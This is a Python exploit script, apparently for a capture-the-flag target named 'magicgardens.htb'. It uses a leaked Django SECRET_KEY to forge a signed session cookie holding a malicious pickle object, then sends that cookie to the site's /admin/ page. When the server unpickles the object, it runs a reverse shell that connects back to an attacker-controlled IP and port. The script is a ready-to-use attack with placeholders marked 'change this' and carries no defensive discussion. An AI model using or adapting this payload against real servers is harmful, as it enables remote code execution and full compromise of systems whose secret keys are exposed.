import os
from django.core import signing
import requests
from django.contrib.sessions.serializers import PickleSerializer
from django.conf import settings

settings.configure(SECRET_KEY='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b')		# get this from the django project scripts
lhost="10.10.14.67"	# change this
lport=4444			# change this

class Shell_code(object):
    def __reduce__(self):
        return (os.system, ((f"""python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &"""),))

cookie = signing.dumps(Shell_code(),
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True)
print(cookie)

response = requests.get('http://magicgardens.htb/admin/', cookies=dict(sessionid=cookie))
print(response.status_code)
